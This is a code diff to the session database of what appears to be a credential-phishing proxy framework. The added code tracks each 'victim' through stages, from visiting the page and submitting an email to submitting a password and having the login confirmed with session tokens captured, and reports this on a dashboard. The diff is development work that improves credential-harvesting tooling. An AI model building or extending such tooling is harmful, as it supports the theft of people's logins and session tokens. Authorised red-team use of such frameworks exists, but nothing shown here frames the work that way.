@@ -28,7 +28,19 @@ type Session struct {
 	Cmsgid       string                             `json:"cmsgid"`
 	Tmsgid       string                             `json:"tmsgid"`
 	Reviewed     bool                               `json:"reviewed"`
+	// Stage records how far the victim actually got. It only ever increases and
+	// is what the dashboard reports on, so an abandoned email entry is never
+	// mistaken for a completed login.
+	Stage int `json:"stage"`
 }
+
+// Stage values, in order. Only genuine evidence promotes a session.
+const (
+	StageVisited       = 0 // session created, nothing typed
+	StageEmail         = 1 // a username/email was submitted
+	StageCredentials   = 2 // username and password both submitted
+	StageAuthenticated = 3 // the provider confirmed the login (tokens captured)
+)
 
 type CookieToken struct {
 	Name     string
@@ -184,6 +196,20 @@ func (d *Database) sessionsUpdateHttpTokens(sid string, tokens map[string]string
 	return err
 }
 
+// SetSessionStage promotes a session's stage, never demoting it.
+func (d *Database) SetSessionStage(sid string, stage int) error {
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	if stage <= s.Stage {
+		return nil
+	}
+	s.Stage = stage
+	s.UpdateTime = time.Now().UTC().Unix()
+	return d.sessionsUpdate(s.Id, s)
+}
+
 func (d *Database) sessionsUpdateCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
 	s, err := d.sessionsGetBySid(sid)
 	if err != nil {
@@ -253,3 +279,6 @@ func (d *Database) sessionsGetBySid(sid string) (*Session, error) {
 	}
 	return s, nil
 }
+
+// Close releases the underlying store (mainly for tests and clean shutdown).
+func (d *Database) Close() error { return d.db.Close() }
